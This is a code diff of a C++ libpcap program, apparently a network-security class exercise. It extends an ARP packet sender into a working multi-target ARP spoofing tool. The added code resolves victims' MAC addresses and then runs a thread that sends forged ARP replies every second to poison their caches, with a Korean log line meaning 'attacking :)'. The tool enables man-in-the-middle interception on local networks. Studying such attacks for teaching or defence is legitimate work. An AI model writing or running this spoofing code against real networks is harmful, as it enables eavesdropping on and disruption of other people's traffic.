@@ -1,19 +1,11 @@
-#include <cstdio>
-#include <stdio.h>
-#include <ifaddrs.h>
-#include <pcap.h>
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
-#include <unistd.h>
-#include <string.h>
-#include <iostream>
-#include "ethhdr.h"
-#include "arphdr.h"
+#include "headers.h"
 
+void usage();
+void check_mac(pcap_t* handle, Ip ip, Mac mac);
 void get_mydevice(char *dev, Mac *mymac, Ip *myip);
 void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
-Mac get_sender_mac(pcap_t *handle, Ip sender_ip);
+void infect(pcap_t* handle);
+Mac get_mac(pcap_t* handle, Ip sender_ip);
 
 #pragma pack(push, 1)
 struct EthArpPacket final
@@ -23,17 +15,25 @@ struct EthArpPacket final
 };
 #pragma pack(pop)
 
-EthArpPacket packet;
-
-void usage()
+typedef struct PacketInfo
 {
-    printf("syntax: send-arp-test <interface>\n");
-    printf("sample: send-arp-test wlan0\n");
-}
+    Mac sender_mac, target_mac;
+    Ip sender_Ip, target_Ip;
+}Info;
+
+
+EthArpPacket packet;
+Mac attacker_mac;
+Ip attacker_Ip;
+Mac broad = Mac::broadcastMac();
+Mac unknown = Mac::nullMac();
+std::map<Ip, Mac> infomap;
+std::list<Info> info_list;
+int thread = 1;
 
 int main(int argc, char *argv[])
 {
-    if (argc != 4)
+    if ((argc < 4) || ((argc % 2) == 1))
     {
         usage();
         return -1;
@@ -49,32 +49,32 @@ int main(int argc, char *argv[])
     }
 
     //edit
-    Mac mymac, sender_mac, target_mac;
-    Ip myIP, sender_IP, target_IP;
-    Mac broad = Mac::broadcastMac();
-    Mac unknown = Mac::nullMac();
-    sender_IP = Ip(std::string(argv[2]));
-    target_IP = Ip(std::string(argv[3]));
-
     //내 맥, 아이피 알아내기
-    get_mydevice(dev, &mymac, &myIP);
-    printf("My Mac: %s\n", std::string(mymac).data());
-    printf("My IP : %s\n", std::string(myIP).data());
+    get_mydevice(dev, &attacker_mac, &attacker_Ip);
+    printf("My Mac: %s\n", std::string(attacker_mac).data());
+    printf("My IP : %s\n", std::string(attacker_Ip).data());
 
-    //상대 ip주소 활용해서 arp 보내기
-    send_arp_packet(broad, mymac, 1, mymac, myIP, unknown, sender_IP, handle);
+    Ip sender_Ip, target_Ip;
+    Mac sender_mac, target_mac;
 
-    //패킷 받아서 센더의 맥어드레스 알아내기
-    sender_mac = get_sender_mac(handle, sender_IP);
-    printf("Sender Mac: %s\n", std::string(sender_mac).data());
-
-    //알아낸 정보들로 최종 공격하기
-     for(int i = 0; i<100; i++)
-   {
-      send_arp_packet(sender_mac, mymac, 2, mymac, target_IP, sender_mac, sender_IP, handle);
-   }
-    //edit
-
+    int count = (argc - 2) / 2;
+    
+    for (int i = 1; i < count + 1; i++)
+    {
+        sender_Ip = Ip(std::string(argv[2 * i]));
+        target_Ip = Ip(std::string(argv[2 * i + 1]));
+        check_mac(handle, sender_Ip, sender_mac);
+        check_mac(handle, target_Ip, target_mac);
+        PacketInfo info;
+        info.sender_Ip = sender_Ip;
+        info.target_Ip = target_Ip;
+        info.sender_mac = infomap[sender_Ip];
+        info.target_mac = infomap[target_Ip];
+        info_list.push_back(info);
+        
+    }
+    std::thread t1(infect, handle);
+    t1.join();
     pcap_close(handle);
 }
 
@@ -137,29 +137,65 @@ void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option
     }
 }
 
-Mac get_sender_mac(pcap_t* handle, Ip sender_IP)
+void check_mac(pcap_t* handle, Ip ip, Mac mac)
 {
-   while(1)
-   {
-      struct pcap_pkthdr *header;
-      const u_char *arp_reply_packet;
-      int res = pcap_next_ex(handle, &header, &arp_reply_packet);
-      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
-      {
-         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-         return 0;
-      }
-      EthArpPacket *sender_packet;
-      sender_packet = (EthArpPacket *)arp_reply_packet;
-      if (sender_packet->arp_.sip() == sender_IP )
-      {
-         printf("Get sender mac!!\n");
-         return sender_packet->arp_.smac_;
-      }
-      else
-      {
-         printf("찾는중.... %s \n", std::string(sender_packet->arp_.sip_).data());
-         continue;
-      }
-   }
+    if (infomap.find(ip) == infomap.end())
+    {
+        mac = get_mac(handle, ip);
+        infomap.insert({ip, mac});
+        printf("Mac: %s\n", std::string(mac).data());
+    }
+    else
+    {
+        printf("해당 ip Mac 주소 있음: %s\n", std::string(infomap[ip]).data());
+    }
+}
+
+void infect(pcap_t* handle)
+{
+    while(thread)
+    {
+        for (auto iter : info_list)
+        {
+            printf("공격 하는중입니당 :)\n");
+            send_arp_packet(iter.sender_mac, attacker_mac, 2, attacker_mac, iter.target_Ip, iter.sender_mac, iter.sender_Ip, handle);
+        }
+        sleep(1);
+    }
+}
+
+Mac get_mac(pcap_t *handle, Ip Ip)
+{
+    //상대 ip주소 활용해서 arp 보내기
+    send_arp_packet(broad, attacker_mac, 1, attacker_mac, attacker_Ip, unknown, Ip, handle);
+
+    while (1)
+    {
+        struct pcap_pkthdr *header;
+        const u_char *arp_reply_packet;
+        int res = pcap_next_ex(handle, &header, &arp_reply_packet);
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            return 0;
+        }
+        EthArpPacket *sender_packet;
+        sender_packet = (EthArpPacket *)arp_reply_packet;
+        if (sender_packet->arp_.sip() == Ip)
+        {
+            printf("Get sender mac!!\n");
+            return sender_packet->arp_.smac_;
+        }
+        else
+        {
+            printf("찾는중.... %s \n", std::string(sender_packet->arp_.sip_).data());
+            continue;
+        }
+    }
+}
+
+void usage()
+{
+    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
